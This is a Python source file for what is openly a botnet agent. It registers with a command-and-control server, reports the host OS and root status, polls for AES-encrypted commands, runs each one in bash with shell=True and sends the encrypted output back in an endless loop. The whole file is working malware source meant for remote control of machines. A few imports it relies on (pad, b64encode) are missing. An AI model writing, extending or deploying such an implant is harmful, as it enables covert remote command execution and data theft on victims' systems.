import requests
import uuid
import time
import platform
import subprocess
import os
from base64 import b64decode
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

C2_URL = "http://127.0.0.1:5000"  # Change if needed for LAN or public IP
BOT_ID = str(uuid.uuid4())

# AES Encryption/Decryption setup
KEY = b64decode('your_base64_key_here')  # Ensure this is the same as the C2's key

def is_root():
    return os.geteuid() == 0

def register():
    data = {
        "id": BOT_ID,
        "os": platform.platform() + (" (root)" if is_root() else "")
    }
    try:
        requests.post(f"{C2_URL}/register", json=data, timeout=5)
    except requests.RequestException:
        pass

def decrypt_data(iv, encrypted_data):
    iv = b64decode(iv)
    encrypted_data = b64decode(encrypted_data)
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    decrypted_data = unpad(cipher.decrypt(encrypted_data), 16).decode('utf-8')
    return decrypted_data

def fetch_command():
    try:
        r = requests.get(f"{C2_URL}/get?id={BOT_ID}", timeout=5)
        if r.status_code == 200:
            data = r.json()
            return decrypt_data(data['iv'], data['cmd'])
    except requests.RequestException:
        return None

def send_output(output):
    try:
        iv, encrypted_output = encrypt_data(output)
        requests.post(f"{C2_URL}/report", json={"id": BOT_ID, "output": encrypted_output, "iv": iv}, timeout=5)
    except requests.RequestException:
        pass

def encrypt_data(data):
    cipher = AES.new(KEY, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(data.encode(), 16))
    iv = b64encode(cipher.iv).decode('utf-8')
    ct = b64encode(ct_bytes).decode('utf-8')
    return iv, ct

def main_loop():
    register()
    while True:
        cmd = fetch_command()
        if cmd:
            try:
                # Run the command in bash, get output
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, executable="/bin/bash")
                output = output.decode(errors="ignore")
            except subprocess.CalledProcessError as e:
                output = e.output.decode(errors="ignore") if e.output else str(e)
            send_output(output)
        time.sleep(5)

if __name__ == "__main__":
    main_loop()
